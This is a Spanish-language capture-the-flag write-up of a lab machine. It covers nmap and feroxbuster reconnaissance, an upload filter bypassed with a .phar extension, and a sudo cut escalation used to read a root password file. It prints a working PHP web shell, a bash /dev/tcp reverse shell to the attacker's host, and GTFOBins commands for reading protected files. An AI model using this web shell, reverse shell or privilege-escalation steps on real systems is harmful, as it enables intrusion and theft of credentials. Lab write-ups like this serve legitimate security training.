Fecha: 13/08/2024

Comienzo haciendo nmap, veo solo un apache no vulnerable en el 80.

```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
[Anonymouspingu](Anonymouspingu.md)```

Hago fuzzing y encuentro varias páginas: 

```
feroxbuster -u http://172.17.0.2 -x php -x html -x txt -x js -x py -w /usr/share/wordlists/directory-list-2.3-medium.txt -o fuzzing --threads 300 
```

![](Imágenes/Pasted%20image%2020240813180751.png)
En http://172.17.0.2/machine.php encuentro que puedo subir archivos. Por tanto, intentaré un #LFI (Local File Inclusion). Pruebo con un txt y veo que solo me deja subir .zips. Interceptaré la petición con burpsuite para engañarle y subir algún archivo .php. Por lo que he visto en otros writeups, esto se llama `Arbitrary File Upload`


```
# Creo un php con el que podré ejecutar comandos remotas: 
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

![](Imágenes/Pasted%20image%2020240813182943.png)

En un principio esta es la petición. Voy a hacer que la máquina se piense que es un zip. Para ello, veo que hay distintas terminaciones de los archivos php: **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module

Al parecer, phar es un conjunto de phps comprimidos, por lo que cuela y se sube. Ahora, podré ver ese archivo en http://172.17.0.2/uploads/script.phar y escribir los comandos que quiera:

![](Imágenes/Pasted%20image%2020240813184507.png)

![](Imágenes/Pasted%20image%2020240813184615.png)


Creo una shell que captaré desde mi máquina: 

```
# En mi máquina (192.168.1.63):

nc -lnvp 443

# En la shell de php: 

bash -c "bash -i >&/dev/tcp/192.168.1.63/443 0>&1"

```

Y ya estoy dentro:

![](Imágenes/Pasted%20image%2020240813185112.png)

Tanto con cut como grep puedo leer archivos como si fuera superusuario. 

![](Imágenes/Pasted%20image%2020240813185352.png)

Voy mirando directorios, y encuentro que en /opt/ hay un archivo: 

![](Imágenes/Pasted%20image%2020240813185538.png)

Uso https://gtfobins.github.io/gtfobins/cut/#sudo para leer el contenido: 

```
LFILE=/opt/nota.txt
sudo cut -d "" -f1 "$LFILE"

# Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.

LFILE=/root/clave.txt
sudo cut -d "" -f1 "$LFILE"

# dockerlabsmolamogollon123

```

![](Imágenes/Pasted%20image%2020240813185747.png)
